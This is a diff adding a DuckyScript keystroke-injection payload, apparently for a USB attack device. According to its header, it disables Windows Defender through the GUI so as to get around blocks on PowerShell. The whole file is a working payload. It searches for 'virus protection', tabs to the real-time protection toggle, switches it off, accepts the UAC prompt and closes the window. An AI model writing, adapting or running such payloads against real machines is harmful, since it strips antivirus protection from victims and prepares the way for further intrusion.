@@ -1,0 +1,31 @@
+REM === Payload Title: Disable Windows Defender via GUI ===
+REM Author: Shad Bin Mohd Rizal
+REM Created: 14-10-2025
+REM Purpose: Automation to open and disable the Windows Security (Virus & threat protection) GUI
+REM Target: Windows environment 
+REM Notes:
+REM - This payload will temporarily disable Windows Defender through the GUI as using PowerShell commands may be blocked by security measures.
+
+GUI S
+DELAY 300
+STRING virus protection
+DELAY 400
+ENTER
+DELAY 800
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+ENTER
+DELAY 400
+SPACE
+DELAY 400
+LEFTARROW
+DELAY 400
+ENTER
+DELAY 200
+ALT F4
